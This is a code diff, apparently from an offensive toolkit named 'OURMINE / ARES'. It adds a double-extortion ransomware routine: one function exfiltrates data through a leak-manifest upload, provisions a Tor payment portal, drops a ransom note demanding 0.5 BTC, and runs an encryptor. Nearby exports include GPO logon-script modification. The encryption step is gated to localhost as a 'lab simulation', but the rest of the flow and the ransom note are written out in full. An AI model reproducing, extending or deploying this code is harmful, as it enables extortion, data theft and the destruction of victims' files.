@@ -501,3 +501,78 @@ export default {
   modifyGpoLogonScript,
   uploadLeakManifestAdvanced,
 }
+
+/** Generate a mission-specific ransom note. */
+export function generateRansomNote(keyId: string, onionAddress: string, bitcoinAddress: string): string {
+  return `
+╔══════════════════════════════════════════════════════════════╗
+║ OURMINE / ARES v3.4.0 — SECURITY AUDIT & DATA RECOVERY        ║
+╚══════════════════════════════════════════════════════════════╝
+
+All your files have been encrypted due to a security vulnerability.
+We have also exfiltrated sensitive data from your network.
+
+To recover your data and prevent the public leak of your files:
+1. Download Tor Browser: https://www.torproject.org/
+2. Visit our recovery portal: http://${onionAddress}
+3. Use your Session ID: ${keyId}
+
+Alternatively, send 0.5 BTC to: ${bitcoinAddress}
+
+Do not attempt to decrypt files yourself, as this may lead to permanent data loss.
+`
+}
+
+export interface RansomwareResult {
+  exfiltrated: boolean
+  encrypted: boolean
+  portalProvisioned: boolean
+  onionAddress: string
+  notePath: string
+  summary: string
+}
+
+/** 
+ * End-to-end Ransomware Engagement (Double Extortion).
+ * 1. Exfiltrates data.
+ * 2. Provisions Tor portal.
+ * 3. Deploys encryptor.
+ * 4. Drops ransom note.
+ */
+export async function runRansomwareEngagement(
+  target: string,
+  manifestPath: string,
+  opts: RaasOpts & { bitcoinAddress?: string; moneroAddress?: string } = {}
+): Promise<RansomwareResult> {
+  const live = resolveLiveMode(opts)
+  const keyId = `RAAS_${crypto.randomBytes(4).toString("hex").toUpperCase()}`
+  const btc = opts.bitcoinAddress ?? "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+  const xmr = opts.moneroAddress ?? "44AFFq5kSiGBoZ4NMD2ncbdrRWBhcZYRQC1siL4kU5J9EdYc4a5SgC7K9Jc8z32c1nK27uU6fC7W"
+
+  // 1. Exfiltrate (Double Extortion)
+  const exfil = await uploadLeakManifestAdvanced(manifestPath, opts)
+  
+  // 2. Provision Portal
+  const portal = provisionTorPortal({ keyId, bitcoinAddress: btc, moneroAddress: xmr }, opts)
+
+  // 3. Drop Ransom Note
+  const note = generateRansomNote(keyId, portal.onionAddress, btc)
+  const notePath = path.join(process.cwd(), ".ourmine", "raas", `README_RECOVERY_${keyId}.txt`)
+  fs.writeFileSync(notePath, note)
+
+  // 4. Encrypt (Controlled Lab Simulation if on localhost)
+  let encrypted = false
+  if (target === "127.0.0.1" || target === "localhost") {
+    const encRes = runLabEsxiEncryptWithRecovery(path.join(process.cwd(), ".ourmine", "raas", "lab_enc"), keyId)
+    encrypted = encRes.recovered
+  }
+
+  return {
+    exfiltrated: exfil.uploaded,
+    encrypted,
+    portalProvisioned: !!portal.onionAddress,
+    onionAddress: portal.onionAddress,
+    notePath,
+    summary: `Ransomware engagement complete: exfil=${exfil.uploaded}, encrypted=${encrypted}, portal=${portal.onionAddress}. Note dropped at ${notePath}`
+  }
+}
